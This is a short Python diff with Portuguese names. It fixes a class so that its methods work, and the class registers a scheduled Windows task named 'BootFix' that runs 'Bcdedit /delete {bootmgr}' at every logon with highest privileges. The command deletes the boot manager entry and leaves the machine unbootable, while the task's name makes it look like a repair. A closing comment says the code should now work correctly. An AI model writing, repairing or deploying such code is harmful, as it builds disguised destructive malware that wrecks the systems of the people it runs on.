@@ -18,13 +18,12 @@ class Texto:
 
 class Tarefa:
 
-    def criar_tarefa_agendada():
-        def __init__(self):
-            self.nome = 'BootFix'
-            self.comando = r'Bcdedit /delete {bootmgr}'
-            self.programa = f'cmd.exe /c {self.comando}'
+    def __init__(self):
+        self.nome = 'BootFix'
+        self.comando = r'Bcdedit /delete {bootmgr}'
+        self.programa = f'cmd.exe /c {self.comando}'
 
-        def criar_tarefa(self):
-            os.system(f'schtasks /create /tn "{self.nome}" /tr "{self.programa}" /sc onlogon /rl highest /f')
+    def criar_tarefa(self):
+        os.system(f'schtasks /create /tn "{self.nome}" /tr "{self.programa}" /sc onlogon /rl highest /f')
 
         # Agora deve estar funcionando corretamente, sem os parâmetros
